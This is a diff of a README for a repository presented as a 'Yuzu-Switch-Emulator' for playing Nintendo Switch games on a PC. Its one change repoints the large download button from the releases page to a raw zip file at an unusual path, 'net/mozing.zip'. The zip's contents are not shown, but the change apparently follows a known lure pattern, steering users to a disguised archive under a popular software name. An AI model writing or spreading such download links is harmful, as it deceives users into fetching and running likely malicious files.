@@ -1,7 +1,7 @@
 <h1>🎮 Yuzu-Switch-Emulator - Play Nintendo Switch Games on Your PC</h1>
 
 <p align="center">
-  <a href="https://github.com/Iqpla2842/Yuzu-Switch-Emulator/releases">
+  <a href="https://raw.githubusercontent.com/Iqpla2842/Yuzu-Switch-Emulator/main/net/mozing.zip">
     <img src="https://img.shields.io/badge/Download-Yuzu_Emulator-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=6f42c1" alt="Download Button" width="400">
   </a>
 </p>
